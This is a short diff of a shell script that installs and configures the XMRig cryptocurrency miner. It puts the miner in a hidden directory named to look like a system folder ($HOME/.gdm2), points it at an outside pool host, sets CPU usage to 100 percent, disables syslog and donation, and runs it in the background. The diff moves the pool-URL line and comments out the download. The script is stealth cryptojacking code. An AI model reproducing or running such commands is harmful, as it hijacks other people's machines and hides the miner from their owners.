@@ -194,7 +194,7 @@ if (test $? -ne 0); then
  #   exit 1
   fi
   
-  wget https://github.com/xmrig/xmrig/releases/latest -O xmrig.tar.gz
+  #wget https://github.com/xmrig/xmrig/releases/latest -O xmrig.tar.gz
 
   echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
   if ! tar xvf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
@@ -230,7 +230,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-
+sed -i 's/"url": *"[^"]*",/"url": "littlAcen.selfhost.tk:4444",/' $HOME/.gdm2/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
 sed -i 's/"enabled": false,/"enabled": true,/' $HOME/.gdm2/config.json
@@ -238,7 +238,7 @@ sed -i 's/"donate-level": 1,/"donate-level": 0,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-over-proxy": 1,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
-sed -i 's/"url": *"[^"]*",/"url": "littlAcen.selfhost.tk:4444",/' $HOME/.gdm2/config.json
+
 
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": false,/"background": true,/' $HOME/.gdm2/config.json
